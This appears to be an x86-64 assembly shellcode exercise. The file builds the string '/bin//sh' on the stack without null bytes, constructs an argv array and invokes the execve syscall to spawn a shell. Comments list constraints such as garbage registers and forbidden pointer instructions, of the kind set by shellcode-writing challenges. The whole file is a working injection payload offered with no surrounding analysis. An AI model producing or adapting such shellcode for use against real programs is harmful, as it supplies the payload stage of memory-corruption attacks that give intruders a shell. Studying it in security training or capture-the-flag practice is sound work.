section .text
global _start

; assumptions:
; 	- registers are garabage
;	- rax has positive value
;	- stack is writable
; 	- No known-zero registers at entry
;	- forbidden
;		- mov rdi, rsp
;		- lea rdi, [rsp]
;		- Any instruction that explicitly computes the pointer in one step

; important
;       1. argv
;               - argv[0] = /bin//sh
;               - argv[1] = NULL
;       2. rsi is a pointer
;               rdi → "/bin//sh"
;               rsi → pointer to argv array
;               rdx → NULL


_start:
	; step 1 make zero one register
	cdq	; rdx = 0

	; step 2 push null terminator
	push rdx

	; step 3 cleanup rax & rsi
	push rdx
	pop rax
	push rax
	pop rsi

	; step 4 string construction (0x2f62696e2f2f7368)
	mov rax, 0x6873
	shl rax, 16		; 0x68730000

	mov si, 0x2f2f
	or rax, rsi		; 0x68732f2f
	shl rax, 16		; 0x68732f2f0000

	mov si, 0x6e69
	or rax, rsi		; 0x68732f2f6e69
	shl rax, 16		; 0x68732f2f6e690000

	mov si, 0x622f
	or rax, rsi		; 0x68732f2f6e69622f	
	
	push rax

	; step 5 assign rdi to path
	push rsp		; stack pointer (push address of rsp to the stack)
	pop rdi			; rdi = [rsp] (not value, it hold address of rsp)

	; step 6 setup rsi (build argv using stack)
	push rdx		; argv[1]
	push rdi		; argv[0]
	push rsp		; address of rsp
	pop rsi			; rsi = &rdi

	mov rax, 59
	syscall
